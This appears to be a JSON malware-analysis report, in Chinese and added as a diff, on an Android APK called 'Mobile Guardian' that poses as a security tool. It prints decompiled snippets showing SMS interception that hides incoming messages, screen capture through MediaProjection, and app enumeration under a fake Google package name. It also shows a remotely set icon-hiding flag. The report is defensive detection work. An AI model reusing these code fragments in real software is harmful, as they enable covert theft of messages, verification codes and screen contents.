@@ -1,0 +1,190 @@
+{
+  "APK信息": {
+    "文件名": "91b4f0062e3e5f130dbee197f0782048b230860518d1a3ed7f35d0fbeee1e259.apk",
+    "sha256": "91b4f0062e3e5f130dbee197f0782048b230860518d1a3ed7f35d0fbeee1e259",
+    "包名": "com.mobile.guard.clean.boost.antivirus",
+    "应用名": "Mobile Guardian",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1630.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\yellow\\security\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f6437a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该代码注册广播接收器监听系统新短信事件。当收到 SMS_RECEIVED 广播时，首先调用 abortBroadcast() 终止广播传播，使系统短信应用和其他应用无法收到该短信（对用户隐藏短信），随后从 Intent extras 中提取 pdus 原始短信数据，通过 SmsMessage.createFromPdu() 解析出短信发送方号码（getDisplayOriginatingAddress()）及短信内容。数据流向：系统短信广播（SMS_RECEIVED Intent 的 pdus 数据）→ abortBroadcast() 隐藏短信 + 解析短信发件人与内容。这是典型的短信拦截行为，可导致用户无法看到扣费通知短信或验证码短信被窃取，与厂商报告中该家族应用（Security Defender 等）窃取用户数据的行为相符。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\jeden\\fanmenu\\services\\ScreenShotService;",
+          "method_signature": "g()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.f4047a = f().getMediaProjection(-1, c);\nthis.b = this.f4047a.createVirtualDisplay(\"screen-mirror\", this.e, this.f, this.g, 16, this.d.getSurface(), null, null);\nImage imageAcquireLatestImage = this.d.acquireLatestImage();\nAsyncTaskCompat.executeParallel(new b(), imageAcquireLatestImage);",
+          "malicious_code_snippet_context": "              startActivity(intent);\n              return;\n          }\n>>>         this.f4047a = f().getMediaProjection(-1, c);\n>>>     }\n>>> \n>>>     private MediaProjectionManager f() {\n          return (MediaProjectionManager) getSystemService(\"media_projection\");\n      }\n  ",
+          "behavior_description": "该代码通过 MediaProjectionManager 获取 MediaProjection 授权后，创建名为 screen-mirror 的虚拟显示屏，将用户屏幕画面实时镜像渲染到 ImageReader 的 Surface 上，随后在 h() 方法中通过 acquireLatestImage() 持续获取屏幕截图帧，并将截图数据交给异步任务（new b()）处理（疑似保存或上传至远端）。数据流向：用户屏幕内容 → createVirtualDisplay() 虚拟屏镜像 → ImageReader Surface → acquireLatestImage() 截图帧 → AsyncTask 异步处理。结合厂商报告确认该样本伪装成安全工具并隐蔽收集用户数据，屏幕截图可捕获登录密码、短信验证码、银行/支付页面等敏感信息，构成隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\common\\util\\AndroidUtil;",
+          "method_signature": "z(Context context)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public static List<String> z(Context context) {\n    return a(context, new Intent(\"android.media.action.IMAGE_CAPTURE\"));\n}\n\nprivate static List<String> a(Context context, Intent intent) {\n    List<ResolveInfo> listQueryIntentActivities = context.getPackageManager().queryIntentActivities(intent, 0);",
+          "malicious_code_snippet_context": "          return a(context, new Intent(\"android.intent.action.SENDTO\", Uri.parse(\"smsto:13410177756\")));\n      }\n  \n>>>     public static List<String> z(Context context) {\n>>>         return a(context, new Intent(\"android.media.action.IMAGE_CAPTURE\"));\n>>>     }\n>>> \n>>>     private static List<String> a(Context context, Intent intent) {\n>>>         ArrayList arrayList = new ArrayList();\n          try {\n              List<ResolveInfo> listQueryIntentActivities = context.getPackageManager().queryIntentActivities(intent, 0);\n              if (listQueryIntentActivities == null || listQueryIntentActivities.size() <= 0) {",
+          "behavior_description": "该代码位于伪装成Google Play Services的假类 com.google.android.gms.common.util.AndroidUtil 中（真实GMS库不存在此类及x/y/z单字母混淆方法，属于恶意代码的命名空间伪装/检测规避手法）。方法z()构造 android.media.action.IMAGE_CAPTURE 意图，通过 PackageManager.queryIntentActivities() 枚举设备上所有能响应拍照意图的应用，即探测设备摄像头/相机应用能力；同类方法x()、y()分别探测拨号(CALL)与短信(SENDTO)能力。数据流向：设备已安装应用列表/硬件能力 → queryIntentActivities() 枚举 → 返回可处理该意图的应用包名列表。该片段本身并未实际调用摄像头拍照（无startActivity或Camera API调用），属于恶意样本的设备能力侦察/设备指纹收集行为，疑似为后续隐私窃取（如秘密拍照、短信相关滥用）做前置环境探测，故camera_capture判定为能力探测而非实际秘密拍照。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\common\\util\\AndroidUtil;",
+          "method_signature": "x(Context context)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public static List<String> x(Context context) {\n    return a(context, new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:111111111\")));\n}",
+          "malicious_code_snippet_context": "          return a(context, intent);\n      }\n  \n>>>     public static List<String> x(Context context) {\n>>>         return a(context, new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:111111111\")));\n>>>     }\n  \n      public static List<String> y(Context context) {\n          return a(context, new Intent(\"android.intent.action.SENDTO\", Uri.parse(\"smsto:13410177756\")));",
+          "behavior_description": "该方法构造一个携带虚拟号码 tel:111111111 的 ACTION_CALL Intent，传入内部方法 a()。结合同类方法 w()（查询HOME启动器）、y()（查询短信应用）、z()（查询相机应用）均返回 List<String> 的模式，可推断 a() 是通过 PackageManager.queryIntentActivities() 查询设备上能处理该 Intent 的应用包名列表。因此该代码并未通过 startActivity() 实际拨打电话（111111111 为占位号码），而是以拨号 Intent 作为探测条件，枚举设备上已安装的拨号/通信类应用，属于应用枚举与设备指纹采集行为。此外该类伪装在 com.google.android.gms（Google Play 服务）包名下以规避检测，真实的 Google 库中不存在此类方法；结合厂商报告确认的隐私窃取与数据收集行为，此应用枚举是恶意样本环境探测与用户画像收集的组成部分。数据流向：PackageManager 查询到的已安装应用信息（source）→ 应用包名列表被收集并返回给上层调用方用于设备指纹/环境探测（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmobi\\flame\\browserlibrary\\config\\jsonbean\\AppConfigBean;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "@SerializedName(\"hide_icon\")\npublic boolean hideIcon = false;",
+          "malicious_code_snippet_context": "      @SerializedName(\"guid_facebook\")\n      public String guidFacebook = \"https://www.facebook.com/Mobile-Guardian-123676984820453/\";\n  \n>>>     @SerializedName(\"hide_icon\")\n>>>     public boolean hideIcon = false;\n  \n      @SerializedName(\"is_old_main\")\n      public boolean is_old_main = false;",
+          "behavior_description": "该代码位于服务端下发 JSON 配置的解析类 AppConfigBean 中，定义了 hide_icon 布尔开关字段（默认 false）。攻击者可通过 C2 服务器远程下发 hide_icon=true 的配置，经 Gson 反序列化后置位 hideIcon 标志，应用据此隐藏桌面启动器图标（如禁用 launcher Activity 组件），使用户难以发现和卸载该应用，为厂商报告中所述的广告推送与隐私收集行为提供隐蔽驻留能力。数据流向：远程服务器 JSON 配置 → Gson 反序列化 → hideIcon 标志位 → 触发图标隐藏逻辑，实现逃避用户卸载的隐蔽驻留。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
